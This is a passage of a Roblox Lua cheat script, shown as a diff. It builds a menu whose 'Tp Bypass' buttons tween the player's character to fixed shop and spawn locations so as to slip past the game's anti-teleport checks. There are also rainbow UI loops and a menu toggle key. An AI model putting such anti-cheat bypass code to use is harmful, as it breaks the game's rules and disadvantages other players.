+jumppw.TextColor3 = Color3.fromRGB(0, 0, 0)
+jumppw.TextScaled = true
+jumppw.TextSize = 14.000
+jumppw.TextWrapped = true
+
+Rainbow_4.Name = "Rainbow"
+Rainbow_4.Parent = ScrollingFrame_2
+Rainbow_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_4.Position = UDim2.new(0.0036663413, 0, -0.00075134635, 0)
+Rainbow_4.Size = UDim2.new(0, 572, 0, 11)
+
+TPbypassbnt.Name = "TP bypassbnt"
+TPbypassbnt.Parent = Mainframe
+TPbypassbnt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TPbypassbnt.Position = UDim2.new(0.00404857844, 0, 0.208251446, 0)
+TPbypassbnt.Size = UDim2.new(0, 200, 0, 25)
+TPbypassbnt.Font = Enum.Font.SourceSansItalic
+TPbypassbnt.Text = "Tp Bypass"
+TPbypassbnt.TextColor3 = Color3.fromRGB(0, 0, 0)
+TPbypassbnt.TextScaled = true
+TPbypassbnt.TextSize = 14.000
+TPbypassbnt.TextWrapped = true
+TPbypassbnt.MouseButton1Down:Connect(function()
+	Tpbypass.Visible = true
+end)
+
+Tpbypass.Name = "Tpbypass"
+Tpbypass.Parent = TPbypassbnt
+Tpbypass.Active = true
+Tpbypass.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Tpbypass.BackgroundTransparency = 0.500
+Tpbypass.Position = UDim2.new(1.23000002, 0, -1.33575809, 0)
+Tpbypass.Size = UDim2.new(0, 249, 0, 409)
+Tpbypass.Visible = false
+
+ScrollingFrame_3.Parent = Tpbypass
+ScrollingFrame_3.Active = true
+ScrollingFrame_3.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
+ScrollingFrame_3.BackgroundTransparency = 0.500
+ScrollingFrame_3.Position = UDim2.new(0.00401606411, 0, 0, 0)
+ScrollingFrame_3.Size = UDim2.new(0, 248, 0, 409)
+
+Spawn.Name = "Spawn"
+Spawn.Parent = ScrollingFrame_3
+Spawn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Spawn.Position = UDim2.new(0.0962323248, 0, 0.0097799506, 0)
+Spawn.Size = UDim2.new(0, 200, 0, 33)
+Spawn.Font = Enum.Font.SourceSansItalic
+Spawn.Text = "Spawn"
+Spawn.TextColor3 = Color3.fromRGB(0, 0, 0)
+Spawn.TextScaled = true
+Spawn.TextSize = 14.000
+Spawn.TextWrapped = true
+Spawn.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass Spawn--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(172.79, 1.14, 74.76);
+end)
+
+WoodsRus.Name = "WoodsRus"
+WoodsRus.Parent = ScrollingFrame_3
+WoodsRus.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WoodsRus.Position = UDim2.new(0.0967741758, 0, 0.0501222424, 0)
+WoodsRus.Size = UDim2.new(0, 200, 0, 33)
+WoodsRus.Font = Enum.Font.SourceSansItalic
+WoodsRus.Text = "WoodsRus"
+WoodsRus.TextColor3 = Color3.fromRGB(0, 0, 0)
+WoodsRus.TextScaled = true
+WoodsRus.TextSize = 14.000
+WoodsRus.TextWrapped = true
+WoodsRus.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass WoodsRus--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(278.47, 4.56, 50.05);
+end)
+
+LandStore.Name = "LandStore"
+LandStore.Parent = ScrollingFrame_3
+LandStore.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LandStore.Position = UDim2.new(0.0967741758, 0, 0.0904645473, 0)
+LandStore.Size = UDim2.new(0, 200, 0, 33)
+LandStore.Font = Enum.Font.SourceSansItalic
+LandStore.Text = "Land Store"
+LandStore.TextColor3 = Color3.fromRGB(0, 0, 0)
+LandStore.TextScaled = true
+LandStore.TextSize = 14.000
+LandStore.TextWrapped = true
+LandStore.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass LandStore--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(290.76, 0.7, -98.62);
+end)
+
+Rainbow_5.Name = "Rainbow"
+Rainbow_5.Parent = ScrollingFrame_3
+Rainbow_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Rainbow_5.Position = UDim2.new(0.0036663413, 0, -0.00075134635, 0)
+Rainbow_5.Size = UDim2.new(0, 572, 0, 11)
+
+FancyFurnishings.Name = "FancyFurnishings"
+FancyFurnishings.Parent = ScrollingFrame_3
+FancyFurnishings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FancyFurnishings.Position = UDim2.new(0.0967741758, 0, 0.169926673, 0)
+FancyFurnishings.Size = UDim2.new(0, 200, 0, 33)
+FancyFurnishings.Font = Enum.Font.SourceSansItalic
+FancyFurnishings.Text = "Fancy Furnishings"
+FancyFurnishings.TextColor3 = Color3.fromRGB(0, 0, 0)
+FancyFurnishings.TextScaled = true
+FancyFurnishings.TextSize = 14.000
+FancyFurnishings.TextWrapped = true
+FancyFurnishings.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass fancyfurnishings--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(497.81, 2.87, -1776.06);
+end)
+
+Boxcar.Name = "Boxcar"
+Boxcar.Parent = ScrollingFrame_3
+Boxcar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Boxcar.Position = UDim2.new(0.0967741758, 0, 0.130806848, 0)
+Boxcar.Size = UDim2.new(0, 200, 0, 33)
+Boxcar.Font = Enum.Font.SourceSansItalic
+Boxcar.Text = "Box car"
+Boxcar.TextColor3 = Color3.fromRGB(0, 0, 0)
+Boxcar.TextScaled = true
+Boxcar.TextSize = 14.000
+Boxcar.TextWrapped = true
+Boxcar.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass Boxcars--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(508.22, 0.7, -1457.63);
+end)
+
+LogicStore.Name = "LogicStore"
+LogicStore.Parent = ScrollingFrame_3
+LogicStore.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+LogicStore.Position = UDim2.new(0.0967741758, 0, 0.210268974, 0)
+LogicStore.Size = UDim2.new(0, 200, 0, 33)
+LogicStore.Font = Enum.Font.SourceSansItalic
+LogicStore.Text = "Links Logic"
+LogicStore.TextColor3 = Color3.fromRGB(0, 0, 0)
+LogicStore.TextScaled = true
+LogicStore.TextSize = 14.000
+LogicStore.TextWrapped = true
+LogicStore.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass linkslogic--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(4605.904, 4.501, -796.389);
+end)
+
+FineArt.Name = "FineArt"
+FineArt.Parent = ScrollingFrame_3
+FineArt.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FineArt.Position = UDim2.new(0.0967741758, 0, 0.250611275, 0)
+FineArt.Size = UDim2.new(0, 200, 0, 33)
+FineArt.Font = Enum.Font.SourceSansItalic
+FineArt.Text = "Fine Art"
+FineArt.TextColor3 = Color3.fromRGB(0, 0, 0)
+FineArt.TextScaled = true
+FineArt.TextSize = 14.000
+FineArt.TextWrapped = true
+FineArt.MouseButton1Down:Connect(function()
+	--peppas efficient tp bypass fineart--
+local plr = game:service"Players".LocalPlayer;
+local tween_s = game:service"TweenService";
+local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+function tp(...)
+   local tic_k = tick();
+   local params = {...};
+   local cframe = CFrame.new(params[1],params[2],params[3]);
+   local tween,err = pcall(function()
+       local tween = tween_s:Create(plr.Character["HumanoidRootPart"],info,{CFrame=cframe});
+       tween:Play();
+   end)
+   if not tween then return err end
+end
+tp(5248.41, -166.18, 730.41);
+end)
+
+-- Scripts:
+
+local function PMLY_fake_script() -- Rainbow_2.Script 
+	local script = Instance.new('Script', Rainbow_2)
+
+	local Rainbow = script.Parent
+	
+	while wait() do
+		for RGB = 0, 255, 4 do
+		wait(.1)
+	    Rainbow.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+	    wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 127)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+	end
+	
+	end
+	
+	
+end
+coroutine.wrap(PMLY_fake_script)()
+local function MOEROHA_fake_script() -- Scripts.Script 
+	local script = Instance.new('Script', Scripts)
+
+	local Rainbow = script.Parent.Parent.Rainbow
+	
+	while wait() do
+		for RGB = 0, 255, 4 do
+		wait(.1)
+	    Rainbow.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+	    wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 127)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+	end
+	
+	end
+	
+	
+end
+coroutine.wrap(MOEROHA_fake_script)()
+local function RTFELT_fake_script() -- Rainbow_3.Script 
+	local script = Instance.new('Script', Rainbow_3)
+
+	local Rainbow = script.Parent
+	
+	while wait() do
+		for RGB = 0, 255, 4 do
+		wait(.1)
+	    Rainbow.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+	    wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 127)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+	end
+	
+	end
+	
+	
+end
+coroutine.wrap(RTFELT_fake_script)()
+local function AADV_fake_script() -- Rainbow_4.Script 
+	local script = Instance.new('Script', Rainbow_4)
+
+	local Rainbow = script.Parent
+	
+	while wait() do
+		for RGB = 0, 255, 4 do
+		wait(.1)
+	    Rainbow.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+	    wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 127)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+	end
+	
+	end
+	
+	
+end
+coroutine.wrap(AADV_fake_script)()
+local function AJEOGW_fake_script() -- Rainbow_5.Script 
+	local script = Instance.new('Script', Rainbow_5)
+
+	local Rainbow = script.Parent
+	
+	while wait() do
+		for RGB = 0, 255, 4 do
+		wait(.1)
+	    Rainbow.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+	    wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(85, 170, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 127)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+		wait(.1)
+		Rainbow.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+	end
+	
+	end
+	
+	
+end
+coroutine.wrap(AJEOGW_fake_script)()
+local function MYTN_fake_script() -- Mainframe.LocalScript 
+	local script = Instance.new('LocalScript', Mainframe)
+
+	local Mainframe = script.Parent.Parent.Mainframe
+	local open = false
+	
+	local PositionClosed = UDim2.new(0.35, 0,-1, 0)
+	local PositionOpen = UDim2.new(0.35, 0,0.25, 0)
+	
+	local UserInputService = game:GetService("UserInputService")
+	
+	UserInputService.InputBegan:connect(function(keyCode)
+		if keyCode.keyCode == Enum.KeyCode.RightShift then
+			if open then
+				Mainframe:TweenPosition(PositionClosed)
+				open = false
+			else
+				open = true
+				Mainframe:TweenPosition(PositionOpen)
+			end
+		end
+	end)
+end
+coroutine.wrap(MYTN_fake_script)()
